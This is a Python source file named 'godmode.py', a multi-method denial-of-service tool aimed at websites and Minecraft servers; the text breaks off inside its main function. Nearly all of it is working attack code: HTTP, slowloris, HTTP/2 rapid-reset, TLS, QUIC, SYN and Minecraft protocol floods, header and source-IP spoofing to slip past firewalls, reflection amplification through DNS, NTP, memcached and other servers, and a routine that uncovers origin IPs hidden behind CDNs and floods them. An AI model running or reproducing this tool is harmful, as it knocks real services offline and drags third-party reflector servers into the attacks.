#!/usr/bin/env python3
# godmode.py — ultimate L7 + Minecraft game DDoS, full spoofing
# pip install aiohttp uvloop (optional)
import argparse, socket, random, time, sys, os, ssl, struct, asyncio, json, re, hashlib

try:
    import aiohttp; HAVE_AIO = True
except ImportError:
    HAVE_AIO = False
try:
    import uvloop; uvloop.install()
except ImportError:
    pass

# ============================================================
#  SPOOF MODULE — spoof everything
# ============================================================
SPOOFED_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36 Edg/124.0.0.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.6367.82 Mobile Safari/537.36",
    "Mozilla/5.0 (iPad; CPU OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
]

SPOOFED_LANGS = ["en-US,en;q=0.9", "en-GB,en;q=0.9", "de-DE,de;q=0.9,en;q=0.8",
                 "fr-FR,fr;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8",
                 "ja-JP,ja;q=0.9,en;q=0.8", "ko-KR,ko;q=0.9,en;q=0.8"]

SPOOFED_ACCEPT = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "*/*",
]

def rnd_ip():
    return f"{random.randint(1,254)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def spoofed_headers(extra=None):
    h = {
        "User-Agent": random.choice(SPOOFED_UAS),
        "Accept": random.choice(SPOOFED_ACCEPT),
        "Accept-Language": random.choice(SPOOFED_LANGS),
        "Accept-Encoding": random.choice(["gzip, deflate, br", "gzip, deflate", "br", "identity"]),
        "Cache-Control": random.choice(["no-cache", "max-age=0", "no-store"]),
        "Pragma": "no-cache",
        "Sec-Ch-Ua": random.choice(['"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"',
                                    '"Microsoft Edge";v="124", "Chromium";v="124", "Not-A.Brand";v="99"']),
        "Sec-Ch-Ua-Mobile": "?0",
        "Sec-Ch-Ua-Platform": random.choice(['"Windows"', '"macOS"', '"Linux"']),
        "Sec-Fetch-Dest": random.choice(["document", "empty", "script", "style"]),
        "Sec-Fetch-Mode": random.choice(["navigate", "cors", "no-cors"]),
        "Sec-Fetch-Site": random.choice(["none", "same-origin", "cross-site"]),
        "Upgrade-Insecure-Requests": "1",
        # IP spoofing headers (some WAFs/proxies trust these)
        "X-Forwarded-For": rnd_ip(),
        "X-Real-IP": rnd_ip(),
        "CF-Connecting-IP": rnd_ip(),
        "True-Client-IP": rnd_ip(),
        "X-Client-IP": rnd_ip(),
        "X-Originating-IP": rnd_ip(),
        "Forwarded": f"for={rnd_ip()};proto=https",
        "Via": f"1.1 {rnd_ip()}",
    }
    if extra:
        h.update(extra)
    return h

# Minecraft spoofed player data
MC_PLAYER_NAMES = ["Steve", "Alex", "Notch", "Herobrine", "jeb_", "Dinnerbone",
                   "Grumm", "Searge", "ProfMobius", "Voxel", "Xaphobia"]
MC_VERSIONS = [765, 764, 763, 762, 761, 760, 759, 758, 757, 756]

def mc_spoofed_name():
    base = random.choice(MC_PLAYER_NAMES)
    return f"{base}{random.randint(100, 9999)}"

def mc_spoofed_uuid():
    return str(hashlib.md5(os.urandom(16)).hexdigest())

# ============================================================
#  STATS
# ============================================================
STATS = {"sent": 0, "errs": 0, "bytes": 0}
LOCK = None

async def bump(s=1, b=0, e=False):
    global LOCK
    async with LOCK:
        STATS["sent"] += s
        STATS["bytes"] += b
        if e: STATS["errs"] += 1

# ============================================================
#  L7 METHODS
# ============================================================

async def http_flood(host, port, use_ssl, duration, conns):
    if not HAVE_AIO:
        return await raw_http_flood(host, port, use_ssl, duration, conns)
    end = time.time() + duration
    connector = aiohttp.TCPConnector(limit=0, ssl=False if not use_ssl else None, force_close=False, enable_cleanup_closed=True)
    timeout = aiohttp.ClientTimeout(total=8)
    paths = ["/", "/index.html", "/api/v1/status", "/login", "/search?q=test", "/wp-login.php", "/xmlrpc.php", "/admin"]
    async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
        sem = asyncio.Semaphore(conns)
        async def one():
            while time.time() < end and not STOP.is_set():
                try:
                    p = random.choice(paths) + f"?r={random.randint(0,999999)}&cache={random.randint(0,999999)}"
                    url = f"{'https' if use_ssl else 'http'}://{host}:{port}{p}"
                    h = spoofed_headers()
                    async with sem:
                        async with sess.get(url, headers=h) as r:
                            await r.read()
                    await bump(1, len(p)+200)
                except Exception:
                    await bump(0, 0, True)
                    await asyncio.sleep(0.02)
        await asyncio.gather(*[one() for _ in range(conns)])

async def raw_http_flood(host, port, use_ssl, duration, conns):
    end = time.time() + duration
    async def one():
        while time.time() < end and not STOP.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
                if use_ssl:
                    ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host)
                p = random.choice(["/", "/index.html"]) + f"?r={random.randint(0,999999)}"
                h = spoofed_headers()
                hdr = f"GET {p} HTTP/1.1\r\nHost: {host}\r\n"
                for k, v in h.items():
                    hdr += f"{k}: {v}\r\n"
                hdr += "\r\n"
                s.send(hdr.encode()); await bump(1, len(hdr)); s.close()
            except Exception:
                await bump(0, 0, True)
                await asyncio.sleep(0.05)
    await asyncio.gather(*[one() for _ in range(conns)])

async def h2_rapid_reset(host, port, use_ssl, duration, conns):
    try:
        import h2.connection
    except ImportError:
        return await http_flood(host, port, use_ssl, duration, conns)
    end = time.time() + duration
    ctx = None
    if use_ssl:
        ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        ctx.set_alpn_protocols(["h2"])
    async def one():
        while time.time() < end and not STOP.is_set():
            try:
                r, w = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=5)
                conn = h2.connection.H2Connection(); conn.initiate_connection()
                w.write(conn.data_to_send()); await w.drain()
                for i in range(1, 100):
                    conn.send_headers(i, [(b":method", b"GET"), (b":path", b"/"), (b":authority", host.encode())], end_stream=True)
                    conn.reset_stream(i, 8)  # CANCEL
                w.write(conn.data_to_send()); await w.drain()
                w.close(); await w.wait_closed()
                await bump(100, 0)
            except Exception:
                await bump(0, 0, True)
                await asyncio.sleep(0.05)
    await asyncio.gather(*[one() for _ in range(conns)])

async def slowloris(host, port, use_ssl, duration, conns):
    end = time.time() + duration
    ctx = None
    if use_ssl:
        ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    async def one():
        while time.time() < end and not STOP.is_set():
            try:
                r, w = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=5)
                w.write(f"GET /?r={random.randint(0,9999)} HTTP/1.1\r\n".encode())
                w.write(f"Host: {host}\r\n".encode()); await w.drain(); await bump(1, 0)
                while time.time() < end and not STOP.is_set():
                    try:
                        w.write(f"X-a: {random.randint(1,9999)}\r\n".encode()); await w.drain(); await bump(1, 0)
                    except Exception: break
                    await asyncio.sleep(10)
                w.close(); await w.wait_closed()
            except Exception:
                await bump(0, 0, True)
                await asyncio.sleep(0.5)
    await asyncio.gather(*[one() for _ in range(conns)])

async def rudy(host, port, use_ssl, duration, conns):
    end = time.time() + duration
    ctx = None
    if use_ssl:
        ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    async def one():
        while time.time() < end and not STOP.is_set():
            try:
                r, w = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=5)
                bl = random.randint(10000, 100000)
                w.write(f"POST / HTTP/1.1\r\nHost: {host}\r\nContent-Length: {bl}\r\n".encode())
                w.write(b"Content-Type: application/x-www-form-urlencoded\r\n\r\n"); await w.drain()
                sent = 0
                while sent < bl and time.time() < end and not STOP.is_set():
                    w.write(b"a"); sent += 1; await bump(1, 1); await asyncio.sleep(0.5); await w.drain()
                w.close(); await w.wait_closed()
            except Exception:
                await bump(0, 0, True)
                await asyncio.sleep(0.5)
    await asyncio.gather(*[one() for _ in range(conns)])

async def websocket_flood(host, port, use_ssl, duration, conns):
    """WebSocket connection flood with spoofed upgrade."""
    end = time.time() + duration
    ctx = None
    if use_ssl:
        ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
    async def one():
        while time.time() < end and not STOP.is_set():
            try:
                r, w = await asyncio.wait_for(asyncio.open_connection(host, port, ssl=ctx), timeout=5)
                key = "dGhlIHNhbXBsZSBub25jZQ=="
                req = (f"GET /ws HTTP/1.1\r\nHost: {host}\r\nUpgrade: websocket\r\n"
                       f"Connection: Upgrade\r\nSec-WebSocket-Key: {key}\r\n"
                       f"Sec-WebSocket-Version: 13\r\nOrigin: https://{host}\r\n")
                for k, v in spoofed_headers().items():
                    req += f"{k}: {v}\r\n"
                req += "\r\n"
                w.write(req.encode()); await w.drain(); await bump(1, len(req))
                # send websocket frames
                for _ in range(50):
                    if time.time() >= end or STOP.is_set(): break
                    frame = b"\x81" + bytes([random.randint(1, 125)]) + os.urandom(random.randint(1, 125))
                    w.write(frame); await w.drain(); await bump(1, len(frame))
                    await asyncio.sleep(0.1)
                w.close(); await w.wait_closed()
            except Exception:
                await bump(0, 0, True)
                await asyncio.sleep(0.05)
    await asyncio.gather(*[one() for _ in range(conns)])

async def cache_bust_flood(host, port, use_ssl, duration, conns):
    """Bypass CDN cache with randomized query strings + headers."""
    end = time.time() + duration
    connector = aiohttp.TCPConnector(limit=0, ssl=False if not use_ssl else None, force_close=False) if HAVE_AIO else None
    if HAVE_AIO:
        timeout = aiohttp.ClientTimeout(total=8)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
            sem = asyncio.Semaphore(conns)
            async def one():
                while time.time() < end and not STOP.is_set():
                    try:
                        cb = random.randint(0, 999999999)
                        p = f"/?cb={cb}&_={random.randint(0,999999)}&v={random.randint(0,999)}"
                        url = f"{'https' if use_ssl else 'http'}://{host}:{port}{p}"
                        h = spoofed_headers({"Cache-Control": "no-cache, no-store, must-revalidate",
                                            "Pragma": "no-cache", "Expires": "0"})
                        async with sem:
                            async with sess.get(url, headers=h) as r:
                                await r.read()
                        await bump(1, len(p)+200)
                    except Exception:
                        await bump(0, 0, True)
                        await asyncio.sleep(0.02)
            await asyncio.gather(*[one() for _ in range(conns)])
    else:
        await raw_http_flood(host, port, use_ssl, duration, conns)

async def cookie_bomb(host, port, use_ssl, duration, conns):
    """Oversized cookie header to stress parsers/WAF."""
    end = time.time() + duration
    async def one():
        while time.time() < end and not STOP.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
                if use_ssl:
                    ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host)
                # build huge cookie
                cookie = "; ".join(f"session{i}={os.urandom(64).hex()}" for i in range(200))
                h = spoofed_headers({"Cookie": cookie})
                p = f"/?r={random.randint(0,999999)}"
                hdr = f"GET {p} HTTP/1.1\r\nHost: {host}\r\n"
                for k, v in h.items():
                    hdr += f"{k}: {v}\r\n"
                hdr += "\r\n"
                s.send(hdr.encode()); await bump(1, len(hdr)); s.close()
            except Exception:
                await bump(0, 0, True)
                await asyncio.sleep(0.05)
    await asyncio.gather(*[one() for _ in range(conns)])

async def tls_handshake_flood(host, port, duration, conns):
    """TLS handshake flood — no cert needed, just ClientHello spam."""
    end = time.time() + duration
    # minimal ClientHello
    client_hello = bytes.fromhex(
        "16030100" + "c8" +  # record header
        "010000c4" +           # handshake header
        "0303" + "00"*32 +    # version + random
        "00" +                 # session id len
        "00" + "02" + "002f" + # cipher suites
        "01" + "00" +          # compression
        "00" + "93" +          # extensions len
        "0000000b0009000006" + "www.example.com".encode().hex().zfill(2) + "00" +
        "000a00080006001d00170018" +
        "000b00020100" +
        "00230000" +
        "0010000e000c02683208687474702f312e31" +
        "000500050100000000" +
        "000d0012001004030804040105030805050108060601" +
        "00120000"
    )
    async def one():
        while time.time() < end and not STOP.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(3)
                s.connect((host, port))
                s.send(client_hello); await bump(1, len(client_hello))
                s.close()
            except Exception:
                await bump(0, 0, True)
                await asyncio.sleep(0.01)
    await asyncio.gather(*[one() for _ in range(conns)])

async def quic_flood(host, port, duration, conns):
    """QUIC initial packet flood (UDP 443)."""
    end = time.time() + duration
    # minimal QUIC initial packet
    quic_pkt = bytes.fromhex("c0" + "00000001" + "08" + "00"*8 + "08" + "00"*8 +
                             "40" + "00" + "00" + "00" + "00" + "00" + "00" + "00" +
                             "00" + "00" + "00" + "00" + "00" + "00" + "00" + "00")
    async def one():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end and not STOP.is_set():
            try:
                s.sendto(quic_pkt + os.urandom(1200), (host, port))
                await bump(1, 1200)
            except Exception:
                await bump(0, 0, True)
            await asyncio.sleep(0)
        s.close()
    await asyncio.gather(*[one() for _ in range(conns)])

async def http_smuggle(host, port, use_ssl, duration, conns):
    """HTTP request smuggling (CL.TE / TE.CL)."""
    end = time.time() + duration
    async def one():
        while time.time() < end and not STOP.is_set():
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(4)
                s.connect((host, port))
                if use_ssl:
                    ctx = ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
                    s = ctx.wrap_socket(s, server_hostname=host)
                # CL.TE smuggle
                smuggle = (
                    "POST / HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    "Content-Length: 4\r\n"
                    "Transfer-Encoding: chunked\r\n"
                    "\r\n"
                    "1\r\nZ\r\nQ\r\n"
                    "\r\n"
                    "GET /admin HTTP/1.1\r\n"
                    f"Host: {host}\r\n"
                    "\r\n"
                )
                s.send(smuggle.encode()); await bump(1, len(smuggle)); s.close()
            except Exception:
                await bump(0, 0, True)
                await asyncio.sleep(0.05)
    await asyncio.gather(*[one() for _ in range(conns)])

# ============================================================
#  MINECRAFT GAME METHODS
# ============================================================
def mc_varint(val):
    out = b""
    while True:
        byte = val & 0x7F
        val >>= 7
        if val:
            byte |= 0x80
        out += bytes([byte])
        if not val:
            break
    return out

def mc_string(s):
    b = s.encode()
    return mc_varint(len(b)) + b

def mc_handshake_packet(host, port, protocol=765, next_state=1):
    """Minecraft Java handshake packet."""
    pkt = mc_varint(0x00)  # packet id
    pkt += mc_varint(protocol)
    pkt += mc_string(host)
    pkt += struct.pack(">H", port)
    pkt += mc_varint(next_state)
    return mc_varint(len(pkt)) + pkt

def mc_status_request():
    return b"\x01\x00"

def mc_login_start_packet(name, uuid=None):
    pkt = mc_varint(0x00)
    pkt += mc_string(name)
    if uuid:
        pkt += bytes.fromhex(uuid.replace("-", ""))
    return mc_varint(len(pkt)) + pkt

def mc_ping_packet():
    return b"\x09\x01" + struct.pack(">q", int(time.time() * 1000))

async def mc_java_flood(host, port, duration, conns, mode="status"):
    """Minecraft Java edition flood. modes: status, handshake, login, ping"""
    end = time.time() + duration
    async def one():
        while time.time() < end and not STOP.is_set():
            try:
                r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=5)
                # handshake
                ver = random.choice(MC_VERSIONS)
                name = mc_spoofed_name()
                hs = mc_handshake_packet(host, port, ver, 1 if mode == "login" else 1)
                w.write(hs); await w.drain()
                if mode == "status":
                    w.write(mc_status_request()); await w.drain()
                    # read response
                    try:
                        await asyncio.wait_for(r.read(4096), timeout=2)
                    except Exception:
                        pass
                elif mode == "login":
                    # switch to login state
                    hs2 = mc_handshake_packet(host, port, ver, 2)
                    w.write(hs2); await w.drain()
                    w.write(mc_login_start_packet(name)); await w.drain()
                elif mode == "ping":
                    w.write(mc_status_request()); await w.drain()
                    try:
                        await asyncio.wait_for(r.read(4096), timeout=2)
                    except Exception:
                        pass
                    w.write(mc_ping_packet()); await w.drain()
                await bump(1, len(hs))
                w.close(); await w.wait_closed()
            except Exception:
                await bump(0, 0, True)
                await asyncio.sleep(0.05)
    await asyncio.gather(*[one() for _ in range(conns)])

async def mc_bedrock_flood(host, port, duration, conns):
    """Minecraft Bedrock (RakNet) flood."""
    end = time.time() + duration
    # RakNet unconnected ping
    ping = b"\x01" + (0).to_bytes(8, "big") + (0x00ffffffffffffff).to_bytes(8, "big") + b"MCCPP;Demo;"
    # Connection request
    conn_req = b"\x05" + (0).to_bytes(8, "big") + b"\x00" * 8 + b"\x00" * 10
    async def one():
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        while time.time() < end and not STOP.is_set():
            try:
                s.sendto(ping, (host, port)); await bump(1, len(ping))
                s.sendto(conn_req, (host, port)); await bump(1, len(conn_req))
            except Exception:
                await bump(0, 0, True)
            await asyncio.sleep(0)
        s.close()
    await asyncio.gather(*[one() for _ in range(conns)])

async def mc_legacy_ping(host, port, duration, conns):
    """Legacy Minecraft server list ping (1.6 and below) — \xfe\x01."""
    end = time.time() + duration
    # legacy ping packet
    legacy = b"\xfe\x01" + "MC|PingHost".encode() + b"\x00" + struct.pack(">H", 74) + mc_string(host) + struct.pack(">I", port)
    async def one():
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        while time.time() < end and not STOP.is_set():
            try:
                s2 = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s2.settimeout(3)
                s2.connect((host, port))
                s2.send(legacy); await bump(1, len(legacy))
                try:
                    s2.recv(1024)
                except Exception:
                    pass
                s2.close()
            except Exception:
                await bump(0, 0, True)
            await asyncio.sleep(0.01)
    await asyncio.gather(*[one() for _ in range(conns)])

# ============================================================
#  AMPLIFICATION METHODS
# ============================================================
async def udp_amp(reflector, port_amp, payload, duration, conns):
    end = time.time() + duration
    socks = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(min(conns, 64))]
    async def one(i):
        s = socks[i % len(socks)]
        while time.time() < end and not STOP.is_set():
            try:
                s.sendto(payload, (reflector, port_amp)); await bump(1, len(payload))
            except Exception:
                await bump(0, 0, True)
            await asyncio.sleep(0)
    await asyncio.gather(*[one(i) for i in range(conns)])
    for s in socks: s.close()

async def dns_amp(reflectors, duration, conns):
    qname = b"\x07example\x03com\x00"
    query = b"\x12\x34\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00" + qname + b"\x00\xff\x00\x01"
    for r in reflectors:
        await udp_amp(r, 53, query, duration // len(reflectors) if reflectors else duration, conns)

async def ntp_amp(reflectors, duration, conns):
    req = b"\x17\x00\x03\x2a" + b"\x00" * 4
    for r in reflectors:
        await udp_amp(r, 123, req, duration // len(reflectors) if reflectors else duration, conns)

async def memcached_amp(reflectors, duration, conns):
    req = b"stats\r\n"
    for r in reflectors:
        await udp_amp(r, 11211, req, duration // len(reflectors) if reflectors else duration, conns)

async def ssdp_amp(reflectors, duration, conns):
    req = (b"M-SEARCH * HTTP/1.1\r\nHOST: 239.255.255.250:1900\r\n"
           b"MAN: \"ssdp:discover\"\r\nMX: 1\r\nST: ssdp:all\r\n\r\n")
    for r in reflectors:
        await udp_amp(r, 1900, req, duration // len(reflectors) if reflectors else duration, conns)

async def cldap_amp(reflectors, duration, conns):
    req = bytes.fromhex("3025020101632004000a01000a0100020100020100010100870b6f626a656374636c6173733000")
    for r in reflectors:
        await udp_amp(r, 389, req, duration // len(reflectors) if reflectors else duration, conns)

async def snmp_amp(reflectors, duration, conns):
    req = bytes.fromhex("302902010004067075626c6963a01c0204" + "00"*4 + "020100020100300e300c06082b060102010101000500")
    for r in reflectors:
        await udp_amp(r, 161, req, duration // len(reflectors) if reflectors else duration, conns)

# ============================================================
#  UDP FLOOD (generic)
# ============================================================
async def udp_flood(host, port, duration, conns, payload_size=1400):
    end = time.time() + duration
    socks = [socket.socket(socket.AF_INET, socket.SOCK_DGRAM) for _ in range(min(conns, 64))]
    async def one(i):
        s = socks[i % len(socks)]
        while time.time() < end and not STOP.is_set():
            try:
                payload = os.urandom(payload_size)
                s.sendto(payload, (host, port)); await bump(1, payload_size)
            except Exception:
                await bump(0, 0, True)
            await asyncio.sleep(0)
    await asyncio.gather(*[one(i) for i in range(conns)])
    for s in socks: s.close()

async def syn_flood(host, port, duration, conns):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    except PermissionError:
        return await connect_flood(host, port, duration, conns)
    end = time.time() + duration
    loop = asyncio.get_event_loop()
    def send():
        try:
            src = rnd_ip(); sport = random.randint(1024, 65535); seq = random.randint(0, 0xFFFFFFFF)
            ip = struct.pack("!BBHHHBBH4s4s", 0x45, 0x00, 0x0028, 0x0000, 0x0000, 0x40, 0x06, 0x0000,
                             socket.inet_aton(src), socket.inet_aton(host))
            tcp = struct.pack("!HHIIBBHHH", sport, port, seq, 0, 0x50, 0x02, 0x1000, 0x0000, 0x0000)
            pseudo = socket.inet_aton(src) + socket.inet_aton(host) + struct.pack("!BBH", 0, 6, len(tcp))
            chk = 0
            for i in range(0, len(pseudo + tcp), 2):
                w = (pseudo + tcp)[i] << 8 | ((pseudo + tcp)[i + 1] if i + 1 < len(pseudo + tcp) else 0)
                chk += w
            chk = (chk >> 16) + (chk & 0xffff); chk = ~chk & 0xffff
            tcp = tcp[:16] + struct.pack("!H", chk) + tcp[18:]
            s.sendto(ip + tcp, (host, 0)); return True
        except Exception:
            return False
    async def one():
        while time.time() < end and not STOP.is_set():
            ok = await loop.run_in_executor(None, send)
            if ok: await bump(1, 40)
            else: await bump(0, 0, True)
            await asyncio.sleep(0)
    await asyncio.gather(*[one() for _ in range(conns)])
    s.close()

async def connect_flood(host, port, duration, conns):
    end = time.time() + duration
    async def one():
        while time.time() < end and not STOP.is_set():
            try:
                r, w = await asyncio.wait_for(asyncio.open_connection(host, port), timeout=3)
                w.close(); await w.wait_closed(); await bump(1, 0)
            except Exception:
                await bump(0, 0, True)
                await asyncio.sleep(0.02)
    await asyncio.gather(*[one() for _ in range(conns)])

# ============================================================
#  METHOD REGISTRY
# ============================================================
METHODS = {
    # L7
    "http":         lambda h, p, s, d, c: http_flood(h, p, s, d, c),
    "h2rapid":      lambda h, p, s, d, c: h2_rapid_reset(h, p, s, d, c),
    "slowloris":    lambda h, p, s, d, c: slowloris(h, p, s, d, c),
    "rudy":         lambda h, p, s, d, c: rudy(h, p, s, d, c),
    "websocket":    lambda h, p, s, d, c: websocket_flood(h, p, s, d, c),
    "cachebust":    lambda h, p, s, d, c: cache_bust_flood(h, p, s, d, c),
    "cookiebomb":   lambda h, p, s, d, c: cookie_bomb(h, p, s, d, c),
    "tlshandshake": lambda h, p, s, d, c: tls_handshake_flood(h, p, d, c),
    "quic":         lambda h, p, s, d, c: quic_flood(h, p, d, c),
    "smuggle":      lambda h, p, s, d, c: http_smuggle(h, p, s, d, c),
    # Minecraft
    "mc_status":    lambda h, p, s, d, c: mc_java_flood(h, p, d, c, "status"),
    "mc_login":     lambda h, p, s, d, c: mc_java_flood(h, p, d, c, "login"),
    "mc_ping":      lambda h, p, s, d, c: mc_java_flood(h, p, d, c, "ping"),
    "mc_bedrock":   lambda h, p, s, d, c: mc_bedrock_flood(h, p, d, c),
    "mc_legacy":    lambda h, p, s, d, c: mc_legacy_ping(h, p, d, c),
    # Generic
    "udp":          lambda h, p, s, d, c: udp_flood(h, p, d, c),
    "syn":          lambda h, p, s, d, c: syn_flood(h, p, d, c),
    "connect":      lambda h, p, s, d, c: connect_flood(h, p, d, c),
    # Amplification (target is ignored, uses reflectors)
    "dnsamp":       None,
    "ntpamp":       None,
    "memamp":       None,
    "ssdpamp":      None,
    "cldapamp":     None,
    "snmpamp":      None,
}

AMP_METHODS = {
    "dnsamp": dns_amp, "ntpamp": ntp_amp, "memamp": memcached_amp,
    "ssdpamp": ssdp_amp, "cldapamp": cldap_amp, "snmpamp": snmp_amp,
}

# ============================================================
#  MAIN
# ============================================================
STOP = None

# ============================================================
#  FULL BYPASS — discover origin + verify + flood
# ============================================================

def discover_origin(domain):
    origins = set()
    try:
        import urllib.request, json
        url = f"https://crt.sh/?q=%25.{domain}&output=json"
        data = json.loads(urllib.request.urlopen(url, timeout=15).read())
        for cert in data:
            name = cert.get("name_value", "")
            for line in name.split("\n"):
                line = line.strip().lstrip("*.")
                if line and domain in line:
                    try:
                        ip = socket.gethostbyname(line.split()[0])
                        if ip and not ip.startswith("104.") and not ip.startswith("172.6"):
                            origins.add(ip)
                    except Exception:
                        pass
    except Exception as e:
        print(f"  crt.sh failed: {e}")
    for sub in ["origin", "direct", "backend", "api", "mail", "ftp", "cpanel", "webmail", "mc", "play"]:
        try:
            ip = socket.gethostbyname(f"{sub}.{domain}")
            if ip and not ip.startswith("104.") and not ip.startswith("172.6"):
                origins.add(ip)
        except Exception:
            pass
    try:
        import subprocess
        out = subprocess.check_output(["dig", "+short", "TXT", domain], text=True, timeout=10)
        for ip in re.findall(r"\d+\.\d+\.\d+\.\d+", out):
            origins.add(ip)
    except Exception:
        pass
    print(f"  found origins: {origins}")
    return list(origins)

async def full_bypass(domain, port, duration, conns, methods):
    """End-to-end: discover origin → verify → flood with all methods."""
    print(f"[*] FULL BYPASS for {domain}")
    # 1. discover origin
    origins = discover_origin(domain)
    if not origins:
        print("  no origin found via auto-discovery, trying common patterns")
        origins = [domain]
    # 2. verify each origin
    verified = []
    for ip in origins:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(3)
            s.connect((ip, port))
            # send MC handshake to verify
            hs = mc_handshake_packet(domain, port, 765, 1)
            s.send(hs + mc_status_request())
            data = s.recv(1024)
            s.close()
            if data and (b"motd" in data.lower() or b"players" in data.lower() or len(data) > 10):
                print(f"  [+] VERIFIED origin: {ip} (MC server responding)")
                verified.append(ip)
            else:
                print(f"  [-] {ip} not responding as MC server")
        except Exception as e:
            print(f"  [-] {ip} connection failed: {e}")
    if not verified:
        print("  no verified origins — flooding all discovered IPs")
        verified = origins
    # 3. flood each verified origin with all methods
    for ip in verified:
        print(f"\n[*] FLOODING ORIGIN {ip}:{port}")
        tasks = []
        for m in methods:
            if m in AMP_METHODS:
                continue
            fn = METHODS[m]
            tasks.append(asyncio.create_task(fn(ip, port, False, duration, conns)))
        # also syn flood
        tasks.append(asyncio.create_task(syn_flood(ip, port, duration, conns)))
        await asyncio.gather(*tasks, return_exceptions=True)
        async with LOCK:
            s, e, b = STATS["sent"], STATS["errs"], STATS["bytes"]
        print(f"  origin {ip}: sent={s} errs={e} bytes={b/1e6:.1f}MB")
    return verified

async def main():
    global STOP, LOCK
    STOP = asyncio.Event() if False else None
    import threading
    STOP_FLAG = {"v": False}
    globals()["STOP"] = STOP_FLAG

    ap = argparse.ArgumentParser(description="godmode — L7 + Minecraft + spoofing + amp")
    ap.add_argument("target", nargs="?")
    ap.add_argument("-p", "--port", type=int, default=80)
    ap.add_argument("-c", "--conns", type=int, default=500)
    ap.add_argument("-d", "--duration", type=int, default=60)
    ap.add_argument("-m", "--methods", nargs="+", default=["http"],
                   choices=list(METHODS.keys()))
    ap.add_argument("--ssl", action="store_true")
    ap.add_argument("--reflectors", help="file with reflector IPs")
    ap.add_argument("--payload", type=int, default=1400)
    ap.add_argument("--mc-mode", default="status", choices=["status", "login", "ping"])
    ap.add_argument("--confirm", action="store_true")
    ap.add_argument("--bypass", action="store_true", help="full bypass: discover origin + verify + flood")
    args = ap.parse_args()

    if not args.confirm:
        print("refusing: pass --confirm"); return

    global STOP
    STOP = False
    LOCK = asyncio.Lock()
    globals()["LOCK"] = LOCK

    port = 443 if (args.ssl and args.port == 80) else args.port
    reflectors = []
    if args.reflectors:
        with open(args.reflectors) as f:
            reflectors = [l.strip() for l in f if l.strip()]

    print(f"target={args.target} port={port} conns={args.conns} duration={args.duration}s "
          f"methods={args.methods} ssl={args.ssl} reflectors={len(reflectors)}")
    if args.bypass:
        await full_bypass(args.target, port, args.duration, args.conns, args.methods)
        return

    tasks = []
    for m in args.methods:
        if m in AMP_METHODS:
            if not reflectors:
                print(f"skip {m}: needs --reflectors"); continue
            tasks.append(asyncio.create_task(AMP_METHODS[m](reflectors, args.duration, args.conns)))
        else:
            fn = METHODS[m]
            tasks.append(asyncio.create_task(fn(args.target, port, args.ssl, args.duration, args.conns)))

    # progress
    async def prog():
        start = time.time()
        while time.time() - start < args.duration:
            await asyncio.sleep(0.5)
            elapsed = time.time() - start
            async with LOCK:
